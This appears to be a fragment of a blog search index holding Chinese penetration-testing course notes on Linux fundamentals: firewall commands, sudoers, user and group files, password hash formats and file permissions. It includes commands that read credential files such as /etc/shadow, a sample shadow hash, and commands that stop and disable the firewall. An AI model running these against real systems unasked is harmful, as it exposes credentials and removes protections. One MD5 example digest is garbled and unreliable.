--list-ports</code></p><ul><li>开启80端口</li></ul><p><code>firewall-cmd --zone = public --add-port= 80/tcp --permanent</code></p><ul><li>重启防火墙</li></ul><p><code>firewall-cmd --reload</code></p><ul><li>停止防火墙</li></ul><p><code>systemctl stop firewalld.service</code></p><ul><li>禁止防火墙开机启动</li></ul><p><code>systemctl disable firewalld.service</code></p><ul><li>删除规则</li></ul><p><code>firewall-cmd --zone=public --remove-port= 80/tcp --permanent</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-10-sudoers填坑</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-10-yong-hu-guan-li/ke-shi-2-10-sudoers-tian-keng/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-10-yong-hu-guan-li/ke-shi-2-10-sudoers-tian-keng/</url>
      
        <content type="html"><![CDATA[<p><a name="vOgWo"></a></p><h1 id="x2F-etc-x2F-sudoers"><a href="#x2F-etc-x2F-sudoers" class="headerlink" title="/etc/sudoers"></a>/etc/sudoers</h1><p>格式:<br>wuya ALL=(ALL) ALL<br>kali ALL=(ALL) NOPASSWD: /bin/useradd</p><p>全拼: super user do<br><code>sudo -l</code><br><code>sudo</code> command (要执行的命令) <a name="LPyxE"></a></p><h3 id="解决没有编辑sudoers权限"><a href="#解决没有编辑sudoers权限" class="headerlink" title="解决没有编辑sudoers权限"></a>解决没有编辑sudoers权限</h3><p>使用<code>visudo</code>编辑权限</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-10-Linux用户和权限管理</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-10-yong-hu-guan-li/ke-shi-1-10-linux-yong-hu-he-quan-xian-guan-li/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-10-yong-hu-guan-li/ke-shi-1-10-linux-yong-hu-he-quan-xian-guan-li/</url>
      
        <content type="html"><![CDATA[<p><a name="DjdiU"></a></p><h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>用户组</li><li>用户</li><li>用户管理相关<strong>文件</strong></li><li>用户管理基本<strong>命令</strong></li><li>文件和目录<strong>归属</strong></li><li>文件和目录<strong>权限</strong> <a name="a0GMV"></a></li></ol><h1 id="用户组Group"><a href="#用户组Group" class="headerlink" title="用户组Group"></a>用户组Group</h1><p><img src="../../../../assets/lw42v2iewcwx3u9y_gryd5v/1668341373504-8243d500-10ce-4c86-ad2b-67119b3585ff.png" alt="image.png"></p><p><a name="qMj8W"></a></p><h2 id="组ID-Group-ID-GID"><a href="#组ID-Group-ID-GID" class="headerlink" title="组ID-Group ID-GID"></a>组ID-Group ID-GID</h2><ol><li>root用户组: GID=0</li><li>程序用户组(系统用户组) : 1-999 (CentOS7)</li><li>普通用户组: 1000-65535</li></ol><p><code>cat /etc/group</code> <a name="YXBOB"></a></p><h2 id="Group相关命令"><a href="#Group相关命令" class="headerlink" title="Group相关命令"></a>Group相关命令</h2><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>查看全部组</td><td>cat /etc/group</td></tr><tr><td>查看用户的所属组</td><td>groups</td></tr><tr><td>添加用户组</td><td>groupadd security</td></tr><tr><td>删除用户组</td><td>groupdel security</td></tr></tbody></table><p><a name="f0Qo5"></a></p><h1 id="用户User"><a href="#用户User" class="headerlink" title="用户User"></a>用户User</h1><p><a name="Yo9ID"></a></p><h2 id="用户ID-User-ID-UID"><a href="#用户ID-User-ID-UID" class="headerlink" title="用户ID-User ID-UID"></a>用户ID-User ID-UID</h2><ol><li>root用户: UID=0 (反之也成立)</li><li>程序用户(系统用户) : 1-999 (CentOS7)</li><li>普通用户: 1000-65535</li></ol><p><code>cat /etc/passwd</code></p><p><a name="fO0hh"></a></p><h2 id="User相关命令"><a href="#User相关命令" class="headerlink" title="User相关命令"></a>User相关命令</h2><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>添加用户</td><td>useradd</td></tr><tr><td>修改用户密码</td><td>passwd</td></tr><tr><td>删除用户</td><td>userdel</td></tr><tr><td>修改用户信息</td><td>usermod</td></tr></tbody></table><p><a name="xxCHT"></a></p><h1 id="用户管理相关文件"><a href="#用户管理相关文件" class="headerlink" title="用户管理相关文件"></a>用户管理相关文件</h1><p><a name="VoNwv"></a></p><h2 id="x2F-etc-x2F-group"><a href="#x2F-etc-x2F-group" class="headerlink" title="/etc/group"></a>/etc/group</h2><ol><li>组名</li><li>组密码</li><li>GID</li><li>用户列表</li></ol><p>影子文件:<br><code>cat /etc/gshadow</code><br>组名: 密码: 组管理员: 组附加用户列表</p><blockquote><p><strong>root<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>0:</strong><br><strong>bin<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>l:</strong><br><strong>daemon<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>2:</strong><br><strong>sys<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>3:</strong><br><strong>adm<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>4:</strong><br><strong>tty<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>5:</strong><br><strong>disk<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>6:</strong><br><strong>lp<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>7:</strong><br><strong>mem<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 8:</strong><br><strong>kmem<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>9:</strong><br><strong>wheel :X: 10:</strong><br><strong>cdrom<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>1l:</strong><br><strong>mail:X: 12: postfix</strong></p></blockquote><p><a name="MqEPK"></a></p><h2 id="x2F-etc-x2F-passwd"><a href="#x2F-etc-x2F-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><blockquote><p>root : x : 0 : 0 : root : /root : /bin/bash<br>bin<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>1:1:bin:/bin:/sbin/nologin<br>daemon: x:2:2:daemon:/sbin:/sbin/nologin<br>adm<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>3:4:adm:/var/adm: / sbin/nologin<br>lp<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>4:7:lp:/var/spool/lpd:/sbin/nologin<br>sync<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>5:0:sync:/sbin: /bin/sync<br>shutdown<span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 6:0:shutdown: /sbin: /sbin/shutdown</p></blockquote><ol><li>用户名</li><li>密码</li><li>UID</li><li>GID</li><li>全名</li><li>home路径</li><li>shell工具</li></ol><p>密码在影子文件：<code>cat /etc/shadow</code> <a name="GSM15"></a></p><h2 id="x2F-etc-x2F-shadow"><a href="#x2F-etc-x2F-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h2><p>wuya : $1$jX8wc27p$bW2rSGQLDCsX2Hz/uwNK70 : 19157 : 0 : 99999 : 7 : : :<br>WWW : ! ! : 19165 : 0 : 99999 : 7 : : :<br>mysql : !! : 19173 : : : : : :</p><ol><li>用户名</li><li>密码</li><li>最后修改时间(1970年1月1日以后的多少天)</li><li>最小修改间隔时间</li><li>密码有效期</li><li>密码需要变更前的警告天数</li><li>密码过期后的宽限天数</li><li>账号失效时间</li><li>保留 <a name="ZOqEA"></a></li></ol><h3 id="密码格式"><a href="#密码格式" class="headerlink" title="密码格式"></a>密码格式</h3><p>命令: openssl passwd -1 -salt admin 123456<br>格式: $id$salt$encrypted<br>示例: $1 $admin$LCIYcRe.ee8dQwgrFc5nz.</p><table><thead><tr><th>数字</th><th>加密方式</th></tr></thead><tbody><tr><td>1</td><td>MD5</td></tr><tr><td>2a</td><td>Blowfish (某些Linux发行版)</td></tr><tr><td>5</td><td>SHA-256</td></tr><tr><td>6</td><td>SHA-512</td></tr></tbody></table><blockquote><p>加密方式MD5 单向 哈希算法(摘要算法)<br>12345 : 6e10adc3949ba59abbe56e057f20f883e<br>abcdef : 7ac66c0f148de9519b8bd264312c4d64</p><p>123456 + “wuya”<br>12wuya3456              salt 盐</p><p>81ca647915e06f3826abece86d3246d0</p></blockquote><p><a name="sR7kI"></a></p><h2 id="etc-x2F-sudoers"><a href="#etc-x2F-sudoers" class="headerlink" title="etc/sudoers"></a>etc/sudoers</h2><p>格式:<br>wuya ALL=(ALL) ALL<br>kali ALL=(ALL) NOPASSWD: /bin/useradd</p><p>全拼: super user do<br><code>sudo -l</code><br>sudo command (要执行的命令)</p><p><a name="LPyxE"></a></p><h3 id="解决没有编辑sudoers权限"><a href="#解决没有编辑sudoers权限" class="headerlink" title="解决没有编辑sudoers权限"></a>解决没有编辑sudoers权限</h3><p>使用<code>visudo</code>编辑权限 <a name="ae7mq"></a></p><h1 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h1><table><thead><tr><th>操作</th><th>命令</th></tr></thead><tbody><tr><td>查询用户账号身份标识</td><td>id</td></tr><tr><td>查询用户账号的登录属性</td><td>finger</td></tr><tr><td>查询当前主机的用户登录情况</td><td>w、who</td></tr><tr><td>查询系统当前在线的用户</td><td>users</td></tr><tr><td>查看用户</td><td>whoami</td></tr><tr><td>切换用户</td><td>su</td></tr></tbody></table><p><a name="W1MA7"></a></p><h1 id="用户和文件的关系"><a href="#用户和文件的关系" class="headerlink" title="用户和文件的关系"></a>用户和文件的关系</h1><p>文件所有者:所属用户、所属组<br>访问权限: 读、写、执行</p><p><a name="v0OCA"></a></p><h2 id="文件和目录归属"><a href="#文件和目录归属" class="headerlink" title="文件和目录归属"></a>文件和目录归属</h2><p>文件的拥有者<br>文件的所属组<br>全拼: change owner<br><code>chown -R wuya /usr/local/soft</code><br><code>chown -R redis:redis /usr/local/soft/redis</code> <a name="TU5md"></a></p><h2 id="文件和目录权限"><a href="#文件和目录权限" class="headerlink" title="文件和目录权限"></a>文件和目录权限</h2><table><thead><tr><th>-</th><th>rw- — —.</th><th>1</th><th>root</th><th>root</th><th>2750 Jun 14 14:53</th><th>anaconda-ks.cfg</th></tr></thead><tbody><tr><td>d</td><td>rwx r-x r-x.</td><td>2</td><td>root</td><td>root</td><td>6 Jun  14 06:55</td><td>Desktop</td></tr></tbody></table><p><a name="XQOnI"></a></p><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><blockquote><ul><li></li></ul><p>d</p></blockquote><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>d</td><td>目录文件(文件夹)</td></tr><tr><td>-</td><td>普通文件</td></tr><tr><td>l</td><td>软链接. (类似Windows的快捷方式)</td></tr><tr><td>b</td><td>块设备文件(例如硬盘、光驱等)</td></tr><tr><td>p</td><td>管道文件</td></tr><tr><td>c</td><td>字符设备文件(例如屏幕等串口设备)</td></tr><tr><td>s</td><td>套接口文</td></tr></tbody></table><p><a name="dS2Lv"></a></p><h3 id="用户类别"><a href="#用户类别" class="headerlink" title="用户类别"></a>用户类别</h3><blockquote><p>rw- — —<br>rwx r-x r-x</p></blockquote><table><thead><tr><th>符号</th><th>单词</th><th>含义</th></tr></thead><tbody><tr><td>u</td><td>user</td><td>所属用户(的权限)</td></tr><tr><td>g</td><td>group</td><td>所属组别(的权限)</td></tr><tr><td>o</td><td>other</td><td>其他用户(的权限)</td></tr></tbody></table><p><a name="OBJYN"></a></p><h3 id="权限类别"><a href="#权限类别" class="headerlink" title="权限类别"></a>权限类别</h3><blockquote><p>rw- — —<br>rwx r-x r-x</p></blockquote><table><thead><tr><th>符号</th><th>单词</th><th>含义</th><th>对于文件</th><th>对于目录</th></tr></thead><tbody><tr><td>r</td><td>read</td><td>可读</td><td>可以读取</td><td>可以浏览内容</td></tr><tr><td>w</td><td>write</td><td>可写</td><td>可以修改</td><td>可以删除、移动内容</td></tr><tr><td>x</td><td>execute</td><td>可执行</td><td>可以执行</td><td>可以进入目录</td></tr><tr><td>-</td><td></td><td>没有权限</td><td></td><td></td></tr></tbody></table><p><a name="PVtTS"></a></p><h3 id="权限类别-1"><a href="#权限类别-1" class="headerlink" title="权限类别"></a>权限类别</h3><p><img src="../../../../assets/lw42v2iewcwx3u9y_gryd5v/1668393003649-1238fd56-fb4c-4253-9bed-f2da11d28f8b.png" alt="image.png"></p><blockquote><p>d rwx rwx r-x. 2 alan security 6 Jul 7 06:08 test<br>775<br>7=4+2+1<br>5=4+1</p></blockquote><p>例如：</p><table><thead><tr><th>数值</th><th>权限</th><th>拆开3段，每3位</th><th>计算</th></tr></thead><tbody><tr><td>444</td><td>r– r– r–</td><td>r–和r–和r–</td><td>4+0+0=4，所以444</td></tr><tr><td>600</td><td>rw- — —</td><td>rw-和—和—</td><td>rw-等于4+2=6, — 等于0, 所以是600</td></tr><tr><td>644</td><td>rw- r– r–</td><td>rw-和r–和r–</td><td>rw-等于4+2=6，r–等于4，所以是644</td></tr><tr><td>666</td><td>rw- rw- rw-</td><td>rw-和rw-和rw-</td><td>rw-等于4+2=6,所以是666</td></tr><tr><td>700</td><td>rwx — —</td><td>rwx和—和—</td><td>rwx等于4+2+1=7，—等于0，所以是700</td></tr><tr><td>744</td><td>rwx r– r–</td><td>rwx和r–和r–</td><td>rwx等于4+2+1=7，r–等于4,所以是744</td></tr><tr><td>755</td><td>rwx r-x r-x</td><td>rwx和r-x和r-x</td><td>rwx等于4+2+1=7，r-x等于4+1=5. 所以是755</td></tr><tr><td>777</td><td>rwx rwx rwx</td><td>rwx和rwx和rwx</td><td>rwx等于4+2+1=7，所以是777</td></tr></tbody></table><p><a name="Nb53d"></a></p><h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><p>#添加组用户的写权限。全拼: change mode<br><code>chmod g+w test.log</code><br>#删除其他用户的所有权限。<br><code>chmod o= test.log</code><br>#使得所有用户都没有写权限。<br><code>chmod a-w test.log</code><br>#当前用户具有所有权限，组用户有读写权限，其他用户只有读权限。<br><code>chmod u=rwx, g=rw, o=r test.log</code><br>#等价的八进制数表示:<br><code>chmod 764 test.log</code><br>#将目录以及目录下的文件都设置为所有用户拥有读写权限。<br>#注意,使用’-R’选项一定要保留当前用户的执行和读取权限，否则会报错!<br><code>chmod -R a=rw testdir/</code><br>#根据其他文件的权限设置文件权限。<br><code>chmod --reference=1.log test.log</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时9-1.6-为什么要学习Linux</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-9-1.6-wei-shi-me-yao-xue-xi-linux/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-9-1.6-wei-shi-me-yao-xue-xi-linux/</url>
      
        <content type="html"><![CDATA[<p><a name="EaU9x"></a></p><h1 id="为什么要学习Linux"><a href="#为什么要学习Linux" class="headerlink" title="为什么要学习Linux?"></a>为什么要学习Linux?</h1><p>1、使用网络的程序，都有一个服务器;<br>2、服务器，大部分使用的是Linux操作系统。 <a name="EUM1M"></a></p><h1 id="学习方法"><a href="#学习方法" class="headerlink" title="学习方法"></a>学习方法</h1><p>1、先学习重点<br>2、分门门别类地学<br>3、不要强行记命令</p><pre><code>cd change directorypwd print working directoryrm removecp copy-f force 强制-v verbose详细-r recursive递归     reverse倒序-i inquir询问</code></pre><p>4、多用，自然熟练</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时8-1.5-服务器操作系统</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-8-1.5-fu-wu-qi-cao-zuo-xi-tong/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-8-1.5-fu-wu-qi-cao-zuo-xi-tong/</url>
      
        <content type="html"><![CDATA[<p><a name="Mwsud"></a></p><h1 id="客户端和服务端"><a href="#客户端和服务端" class="headerlink" title="客户端和服务端"></a>客户端和服务端</h1><p>客户端Client：软件/网页<br>网络<br>服务器Server</p><p><a name="Duyeb"></a></p><h1 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h1><p>C/S架构: Client/Server</p><ul><li>客户端:迅雷、QQ、百度网盘、腾讯课堂、网易云音乐、游戏客户端、腾讯视频……</li><li>特点:需要安装和升级，占用资源多，性能高</li><li></li></ul><p>B/S架构: Browser/Server</p><ul><li>浏览器: Chrome、FireFox、 Edge、 360…..</li><li>站点:百度、知乎、微博贴吧、淘宝……</li><li>特点:不用安装维护，跨操作系统，占用资源低</li></ul><p><a name="QaDmM"></a></p><h1 id="服务器的组成部分"><a href="#服务器的组成部分" class="headerlink" title="服务器的组成部分"></a>服务器的组成部分</h1><p><a name="RCZky"></a></p><h2 id="服务器硬件"><a href="#服务器硬件" class="headerlink" title="服务器硬件"></a>服务器硬件</h2><p><a name="mLOFz"></a></p><h2 id="服务器操作系统"><a href="#服务器操作系统" class="headerlink" title="服务器操作系统"></a>服务器操作系统</h2><p>Windows Server系列<br>Linux系列: Redhat、CentOS、 Debian、 Ubuntu<br>Unix系列: SUN Solaris、BSD Unix <a name="w0auc"></a></p><h2 id="HTTP容器-Web服务器"><a href="#HTTP容器-Web服务器" class="headerlink" title="HTTP容器(Web服务器)"></a>HTTP容器(Web服务器)</h2><p>Tomcat、Apache、 Nginx、 Weblogic、 JBoss..</p><p><a name="FZCsq"></a></p><h2 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h2><p>各种编程语言开发的软件项目: Java、 PHP、C、<br>Python、Ruby、 Go……</p><p><a name="Bvmub"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>应用程序                   &amp;#x20;<br>HTTP容器                   数据库<br>服务器操作系统          服务器操作系统<br>服务器硬件                 服务器硬件</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时7-1.4-个人电脑操作系统</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-7-1.4-ge-ren-dian-nao-cao-zuo-xi-tong/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-7-1.4-ge-ren-dian-nao-cao-zuo-xi-tong/</url>
      
        <content type="html"><![CDATA[<p><a name="iwxZD"></a></p><h1 id="计算机和个人电脑"><a href="#计算机和个人电脑" class="headerlink" title="计算机和个人电脑"></a>计算机和个人电脑</h1><p>1946年:计算机发明<br>20世纪90年代:个人电脑(PC)流行</p><p><a name="rQ5d0"></a></p><h1 id="计算机发展"><a href="#计算机发展" class="headerlink" title="计算机发展"></a>计算机发展</h1><p>微软DOS<br>Windows 95<br>Windows XP<br>Windows 7<br>Windows 10</p><p><a name="Y0W49"></a></p><h1 id="国产操作系统"><a href="#国产操作系统" class="headerlink" title="国产操作系统"></a>国产操作系统</h1><table><thead><tr><th>名称</th><th>公司</th></tr></thead><tbody><tr><td>中标棋麟</td><td>中标软件有限公司</td></tr><tr><td>中兴新支点</td><td>广东中兴新支点技术有限公司</td></tr><tr><td>中科方德</td><td>中科方德软件有限公司</td></tr><tr><td>优麒麟</td><td>中国CCN联合实验室</td></tr><tr><td>银河麒麟</td><td>天津热聚信息技术有限公司</td></tr><tr><td>一铭Linux</td><td>一铭软件股份有限公司</td></tr><tr><td>深度Linux</td><td>武汉深之度科技有限公司</td></tr><tr><td>StartOS</td><td>东莞瓦力网络科技有限公司</td></tr><tr><td>凝思Linux</td><td>北京凝思软件股份有限公司</td></tr><tr><td>COS操作系统</td><td>上海联彤网络通讯技术有限上司</td></tr><tr><td>思普操作系统</td><td>云南思普投资有限公司</td></tr><tr><td>华为鸿蒙系统</td><td>华为技术有限公司</td></tr></tbody></table><p><a name="dD6pW"></a></p><h1 id="其他操作系统"><a href="#其他操作系统" class="headerlink" title="其他操作系统"></a>其他操作系统</h1><p>Apple: MacOS<br>其他设备: ATM、POS、汽车、智能音箱、航天飞船…..</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时6-1.3.2-程序运行原理-编程语言</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-6-1.3.2-cheng-xu-yun-xing-yuan-li-bian-cheng-yu-yan/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-6-1.3.2-cheng-xu-yun-xing-yuan-li-bian-cheng-yu-yan/</url>
      
        <content type="html"><![CDATA[<p><a name="cKSgq"></a></p><h1 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h1><p><a name="g3Bys"></a></p><h2 id="第一代语言："><a href="#第一代语言：" class="headerlink" title="第一代语言："></a>第一代语言：</h2><p>机器语言:二进制代码语言<br>01000000101 <a name="DIpzv"></a></p><h2 id="第二代语言："><a href="#第二代语言：" class="headerlink" title="第二代语言："></a>第二代语言：</h2><p>汇编语言:用英文字母或符号串来替代操作<br>LOAD A<br>ADD B<br>STORE C <a name="nmm2t"></a></p><h2 id="第三代语言："><a href="#第三代语言：" class="headerlink" title="第三代语言："></a>第三代语言：</h2><p>面向过程语言：Fortran，Basic，C，Pascal<br>面向对象语言：SmallTalk，EIFFEL，Ada，C++，c#，python，Java，golang<br>高级编程语言是面向过程和面向对象语言。贴近自然语言，不直接操作硬件，可移植<br>C= A+ B;</p><p><a name="qM5HH"></a></p><h1 id="从源代码到可执行程序"><a href="#从源代码到可执行程序" class="headerlink" title="从源代码到可执行程序"></a>从源代码到可执行程序</h1><p>源程序→编译器→汇编语言程序→汇编器→机器代码→链接器，加载器→目标机器代码</p><p><a name="Mqw1A"></a></p><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p><a name="XnNQI"></a></p><h2 id="为什么需要操作系统-Operating-System"><a href="#为什么需要操作系统-Operating-System" class="headerlink" title="为什么需要操作系统(Operating System) ?"></a>为什么需要操作系统(Operating System) ?</h2><p>1、提供API,屏蔽硬件差异<br>2、协调系统资源</p><p><a name="j7D5D"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>计算机应用程序<br>操作系统，编译原理，计算机网络<br>计算机体系结构<br>CPU/GPU，内存/硬盘，显示器/键盘</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时5-1.3.1-程序运行原理-二进制</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-5-1.3.1-cheng-xu-yun-xing-yuan-li-er-jin-zhi/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-5-1.3.1-cheng-xu-yun-xing-yuan-li-er-jin-zhi/</url>
      
        <content type="html"><![CDATA[<p><a name="LML5z"></a></p><h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p><a name="SBB88"></a></p><h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><p><a name="NsoDV"></a></p><h2 id="为什么说计算机只认识0和1"><a href="#为什么说计算机只认识0和1" class="headerlink" title="为什么说计算机只认识0和1?"></a>为什么说计算机只认识0和1?</h2><p>电路状态。 <a name="UhUdT"></a></p><h2 id="有其他进制的计算机吗"><a href="#有其他进制的计算机吗" class="headerlink" title="有其他进制的计算机吗?"></a>有其他进制的计算机吗?</h2><p>九章计算机：三进制</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时4-1.2.3-计算机硬件组成-硬盘</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-4-1.2.3-ji-suan-ji-ying-jian-zu-cheng-ying-pan/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-4-1.2.3-ji-suan-ji-ying-jian-zu-cheng-ying-pan/</url>
      
        <content type="html"><![CDATA[<p><a name="CYR4n"></a></p><h1 id="硬盘类型"><a href="#硬盘类型" class="headerlink" title="硬盘类型"></a>硬盘类型</h1><p>机械硬盘<br>固态硬盘</p><p><a name="m8QnV"></a></p><h1 id="机械硬盘和固态硬盘工作原理"><a href="#机械硬盘和固态硬盘工作原理" class="headerlink" title="机械硬盘和固态硬盘工作原理"></a>机械硬盘和固态硬盘工作原理</h1><p>机械硬盘HDD3.5”<br>盘片，主轴，读写磁头，磁头臂，音圈点机，永磁铁</p><p>固态硬盘SSD2.5<br>缓存，NAND闪存，主控</p><p><a name="BIHTX"></a></p><h1 id="硬盘-外存"><a href="#硬盘-外存" class="headerlink" title="硬盘:外存"></a>硬盘:外存</h1><p>硬盘和内存的区别:<br>1、读写速度<br>2、作用<br>3、持久存储</p><p><a name="lHv6L"></a></p><h1 id="输入输出设备"><a href="#输入输出设备" class="headerlink" title="输入输出设备"></a>输入输出设备</h1><p>输入设备:键盘、鼠标、麦克风、摄像头、扫描仪、数位板、游戏手柄等等;<br>输出设备:显示器、打印机、音响等等。</p><p>显卡(GPU)<br>声卡</p><p><a name="PJFOK"></a></p><h1 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h1><p><img src="../../../../assets/ayxmuuq5wid3qlc7_fkuogd/1668214884531-74605f47-155b-487a-a385-cb812a0d5f8d.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时3-1.2.2-计算机硬件组成-内存</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-3-1.2.2-ji-suan-ji-ying-jian-zu-cheng-nei-cun/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-3-1.2.2-ji-suan-ji-ying-jian-zu-cheng-nei-cun/</url>
      
